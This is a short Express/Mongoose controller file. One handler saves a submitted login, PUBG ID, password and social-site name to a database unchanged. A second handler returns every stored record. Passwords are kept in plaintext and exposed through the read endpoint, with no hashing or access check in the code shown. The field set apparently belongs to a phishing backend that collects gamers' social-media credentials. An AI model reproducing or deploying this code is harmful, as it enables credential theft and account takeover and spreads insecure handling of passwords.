import informationModel from "../../models/information.js";

export const createInformation = async (req, res) => {
  const { login, pubgId, password, socialSite } = req.body;

  try {
    const information = await informationModel.create({
      login,
      pubgId,
      password,
      socialSite,
    });
    res.status(200).json(information);
  } catch (err) {
    res.status(500).json({ message: "Something went wrong" });
    console.log(err);
  }
};

export const getInformation = async (req, res) => {
  try {
    const information = await informationModel.find();
    res.status(200).json(information);
  } catch (err) {
    res.status(500).json({ message: "Something went wrong" });
    console.log(err);
  }
};
